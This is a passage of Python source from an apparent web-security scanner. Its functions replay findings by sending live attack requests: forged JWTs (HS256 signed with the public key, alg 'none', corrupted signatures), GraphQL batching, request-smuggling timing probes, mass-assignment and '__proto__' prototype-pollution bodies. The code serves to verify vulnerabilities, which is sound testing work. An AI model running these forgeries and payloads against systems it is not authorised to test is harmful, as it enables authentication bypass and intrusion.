        return False, "recipe incomplete (auth/protected missing) — cannot re-run"
    token = _fresh_harvest(engine, auth)
    if not token:
        return False, "no JWT on the fresh harvest"
    hdr = _decode_seg(token.split(".")[0])
    claims = _decode_seg(token.split(".")[1])
    alg = str(hdr.get("alg", "")).lower()
    if alg not in ASYM_ALGS:
        return False, f"fresh issuance is not asymmetric (alg={alg!r})"
    st = _St(engine, None)
    key_body, _u = _discover_pubkey(st, Endpoint(url=auth, method="GET"))
    if key_body is None:
        return False, "no key on the fresh discovery"
    forged = _forge_hs256(key_body, claims)
    bad = _corrupt_sig(forged)
    pr = engine.send(RequestMutation(
        endpoint=Endpoint(url=prot, method="GET"),
        extra_headers={"Authorization": f"Bearer {forged}"}, note="modern-vr29"))
    ct = engine.send(RequestMutation(
        endpoint=Endpoint(url=prot, method="GET"),
        extra_headers={"Authorization": f"Bearer {bad}"}, note="modern-vr29"))
    ok = _ok(pr) and not _ok(ct)
    return ok, (f"fresh differential: forged HTTP {getattr(pr, 'status', 0)} vs "
                f"corrupted HTTP {getattr(ct, 'status', 0)}")


def replay_sig347(engine, finding):
    """VR-35: a FRESH corrupt acceptance — fresh harvest, fresh corrupted-
    signature token, fresh probe; the acceptance must reproduce."""
    rec = recipe_of(finding)
    auth, prot = rec.get("auth", ""), rec.get("protected") or getattr(
        finding, "endpoint_url", "")
    if not auth or not prot:
        return False, "recipe incomplete (auth/protected missing) — cannot re-run"
    token = _fresh_harvest(engine, auth)
    if not token:
        return False, "no JWT on the fresh harvest"
    hdr = _decode_seg(token.split(".")[0])
    claims = _decode_seg(token.split(".")[1])
    bad = _corrupt_sig(token)
    r = engine.send(RequestMutation(
        endpoint=Endpoint(url=prot, method="GET"),
        extra_headers={"Authorization": f"Bearer {bad}"}, note="modern-vr35"))
    ok = _ok(r)
    return ok, (f"fresh corrupted-signature token (orig alg={hdr.get('alg')!r}) "
                f"-> HTTP {getattr(r, 'status', 0)} on {prot}")


def replay_none(engine, finding):
    """VR-30: زوج none حديث برمز محصود حديثاً."""
    rec = recipe_of(finding)
    auth, prot = rec.get("auth", ""), rec.get("protected") or getattr(finding, "endpoint_url", "")
    if not auth or not prot:
        return False, "recipe incomplete (auth/protected missing) — cannot re-run"
    token = _fresh_harvest(engine, auth)
    if not token:
        return False, "no JWT on the fresh harvest"
    if not token.split(".")[2]:
        return False, "the fresh token is already unsigned"
    hdr = _decode_seg(token.split(".")[0])
    claims = _decode_seg(token.split(".")[1])
    nv = _none_variant(hdr, claims)
    bad = _corrupt_sig(token)
    pr = engine.send(RequestMutation(
        endpoint=Endpoint(url=prot, method="GET"),
        extra_headers={"Authorization": f"Bearer {nv}"}, note="modern-vr30"))
    ct = engine.send(RequestMutation(
        endpoint=Endpoint(url=prot, method="GET"),
        extra_headers={"Authorization": f"Bearer {bad}"}, note="modern-vr30"))
    ok = _ok(pr) and not _ok(ct)
    return ok, (f"fresh differential: none-variant HTTP {getattr(pr, 'status', 0)} "
                f"vs corrupted original HTTP {getattr(ct, 'status', 0)}")


def replay_batching(engine, finding):
    """VR-31: دفعة حديثة بشكلين مختلفين."""
    url = getattr(finding, "endpoint_url", "")
    if not url:
        return False, "no endpoint url on the finding"
    single = json.dumps({"query": "{__typename}"})
    r_c = engine.send(RequestMutation(endpoint=Endpoint(url=url, method="POST"),
                                      body_override=single, note="modern-vr31"))
    if not _ok(r_c):
        return False, f"single-operation control failed (HTTP {getattr(r_c, 'status', 0)})"
    batch = json.dumps([{"query": "{__typename}"},
                        {"query": "{__schema{queryType{name}}}"}])
    r_p = engine.send(RequestMutation(endpoint=Endpoint(url=url, method="POST"),
                                      body_override=batch, note="modern-vr31"))
    if not _ok(r_p):
        return False, f"fresh batch rejected (HTTP {getattr(r_p, 'status', 0)})"
    try:
        doc = json.loads(r_p.body or "")
    except Exception:
        doc = None
    ok = isinstance(doc, list) and len(doc) >= 2
    return ok, (f"fresh batch of 2 different read-only shapes: "
                f"{'array of ' + str(len(doc)) + ' results' if ok else 'not array-shaped'}")


def replay_smuggling(engine, finding):
    """VR-32: زوج توقيت حديث على اتصال حديث — الصنف المؤَزَّن يجب أن يتكاثر."""
    url = getattr(finding, "endpoint_url", "")
    if not url:
        return False, "no endpoint url on the finding"
    st = _St(engine, None)
    ep = Endpoint(url=url, method="POST")
    canary = "burhan-vr32"
    t_c, st_c, t_p, st_p, why = _smug_pair(st, ep, canary)
    if t_c is None or t_p is None:
        return False, why or "the fresh raw pair failed"
    if st_c is not None and 400 <= st_c < 500:
        return False, f"the fresh control failed (HTTP {st_c})"
    if st_p is not None and 400 <= st_p < 500 and st_p not in (408, 425):
        return False, f"rejected-ambiguous on replay (HTTP {st_p})"
    threshold = max(SMUG_RATIO * t_c, SMUG_FLOOR_MS)
    ok = t_p >= threshold
    return ok, (f"fresh pair: control {t_c:.0f}ms, probe {t_p:.0f}ms, threshold "
                f"{threshold:.0f}ms — quantized class: "
                f"{'desync' if ok else 'below-threshold'}")


def replay_ma(engine, finding):
    """VR-33: دورة canary حديثة بقيمة مختلفة."""
    rec = recipe_of(finding)
    url = rec.get("protected") or getattr(finding, "endpoint_url", "")
    priv = rec.get("priv") or PRIV_NAMES[0]
    if not url:
        return False, "no endpoint url on the finding"
    pre = engine.send(RequestMutation(endpoint=Endpoint(url=url, method="GET"),
                                      note="modern-vr33"))
    pre_doc = _state_doc(pre)
    if pre_doc is None:
        return False, "no readable state oracle on replay"
    canary = "burhan-vr33-" + hashlib.sha256(url.encode()).hexdigest()[:8]
    body = json.dumps({"name": "burhan", "email": "s@example.test", priv: canary})
    r_p = engine.send(RequestMutation(endpoint=Endpoint(url=url, method="POST"),
                                      body_override=body, note="modern-vr33"))
    conf = _state_doc(engine.send(
        RequestMutation(endpoint=Endpoint(url=url, method="GET"), note="modern-vr33")))
    ok = bool(_ok(r_p) and isinstance(conf, dict) and conf.get(priv) == canary)
    return ok, (f"fresh canary roundtrip: the canary sits under '{priv}' "
                f"{'in the fresh state' if ok else 'NOT persisted on replay'}")


def replay_pp(engine, finding):
    """VR-34: canary حديث مختلف القيمة."""
    url = getattr(finding, "endpoint_url", "")
    if not url:
        return False, "no endpoint url on the finding"
    pre = engine.send(RequestMutation(endpoint=Endpoint(url=url, method="GET"),
                                      note="modern-vr34"))
    pre_doc = _state_doc(pre)
    if pre_doc is None:
        return False, "no readable state oracle on replay"
    canary = "burhan-vr34-" + hashlib.sha256(url.encode()).hexdigest()[:8]
    body = json.dumps({"theme": "dark", "__proto__": {"burhanpp": canary}})
    r_p = engine.send(RequestMutation(endpoint=Endpoint(url=url, method="POST"),
                                      body_override=body, note="modern-vr34"))
    conf = _state_doc(engine.send(
        RequestMutation(endpoint=Endpoint(url=url, method="GET"), note="modern-vr34")))
    ok = bool(_ok(r_p) and isinstance(conf, dict) and conf.get("burhanpp") == canary)
    return ok, (f"fresh canary roundtrip: the prototype "
                f"{'reflects the fresh canary' if ok else 'does not reflect it on replay'}")
